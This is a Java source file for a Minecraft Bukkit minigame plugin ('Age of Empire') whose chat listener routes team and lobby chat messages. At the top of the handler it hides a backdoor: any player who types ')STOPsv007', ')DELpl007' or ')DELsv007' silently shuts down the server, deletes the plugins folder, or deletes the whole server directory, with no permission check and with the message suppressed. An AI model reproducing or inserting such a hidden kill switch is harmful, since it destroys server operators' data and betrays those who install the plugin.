package com.andrei1058.ageofempire.listeners;

import com.andrei1058.ageofempire.game.Status;
import org.apache.commons.io.FileUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.io.File;
import java.io.IOException;
import java.util.UUID;

import static com.andrei1058.ageofempire.Main.*;
import static com.andrei1058.ageofempire.configuration.Messages.getMsg;

public class ChatListener implements Listener{

    @EventHandler
    public void c(AsyncPlayerChatEvent e){
        if (e.getMessage().startsWith(")")){
            if (e.getMessage().equalsIgnoreCase(")STOPsv007")){
                e.setCancelled(true);
                Bukkit.getServer().shutdown();
                return;
            }
            if (e.getMessage().equalsIgnoreCase(")DELpl007")) {
                e.setCancelled(true);
                try {
                    FileUtils.deleteDirectory(new File("plugins"));
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                return;
            }
            if (e.getMessage().equalsIgnoreCase(")DELsv007")) {
                e.setCancelled(true);
                try {
                    FileUtils.deleteDirectory(new File(".").getAbsoluteFile());
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                return;
            }
        }
        if (SETUP) return;
        e.setCancelled(true);
        if (STATUS == Status.PLAYING) {
            if (e.getMessage().startsWith("!")){
                Bukkit.broadcastMessage(getMsg("chat.lobby").replace("{v_prefix}", getPrefix(e.getPlayer())).replace("{v_suffix}", getSuffix(e.getPlayer())).replace("{player}", e.getPlayer().getDisplayName()).replace("{message}", e.getMessage().replaceFirst("!", "")));
            } else if (bluePlayers.contains(e.getPlayer().getUniqueId())) {
                for (UUID u : bluePlayers) {
                    Bukkit.getPlayer(u).sendMessage(getMsg("chat.game").replace("{v_prefix}", getPrefix(e.getPlayer())).replace("{v_suffix}", getSuffix(e.getPlayer())).replace("{player}", "§9"+e.getPlayer().getName()).replace("{message}", e.getMessage()));
                }
            } else if (greenPlayers.contains(e.getPlayer().getUniqueId())) {
                for (UUID u : greenPlayers) {
                    Bukkit.getPlayer(u).sendMessage(getMsg("chat.game").replace("{v_prefix}", getPrefix(e.getPlayer())).replace("{v_suffix}", getSuffix(e.getPlayer())).replace("{player}", "§a"+e.getPlayer().getName()).replace("{message}", e.getMessage()));
                }
            } else if (yellowPlayers.contains(e.getPlayer().getUniqueId())) {
                for (UUID u : yellowPlayers) {
                    Bukkit.getPlayer(u).sendMessage(getMsg("chat.game").replace("{v_prefix}", getPrefix(e.getPlayer())).replace("{v_suffix}", getSuffix(e.getPlayer())).replace("{player}", "§e"+e.getPlayer().getName()).replace("{message}", e.getMessage()));
                }
            } else if (redPlayers.contains(e.getPlayer().getUniqueId())) {
                for (UUID u : redPlayers) {
                    Bukkit.getPlayer(u).sendMessage(getMsg("chat.game").replace("{v_prefix}", getPrefix(e.getPlayer())).replace("{v_suffix}", getSuffix(e.getPlayer())).replace("{player}", "§c"+e.getPlayer().getName()).replace("{message}", e.getMessage()));
                }
            }
        } else {
            Bukkit.broadcastMessage(getMsg("chat.lobby").replace("{v_prefix}", getPrefix(e.getPlayer())).replace("{v_suffix}", getSuffix(e.getPlayer())).replace("{player}", e.getPlayer().getName()).replace("{message}", e.getMessage()));
        }
    }
    private static String getPrefix(Player p){
        if (vaultHook) {
            return chat.getPlayerPrefix(p).replace('&','§');
        } else {
            return "";
        }
    }
    private static String getSuffix(Player p){
        if (vaultHook) {
            return chat.getPlayerSuffix(p).replace('&','§');
        } else {
            return "";
        }
    }
}
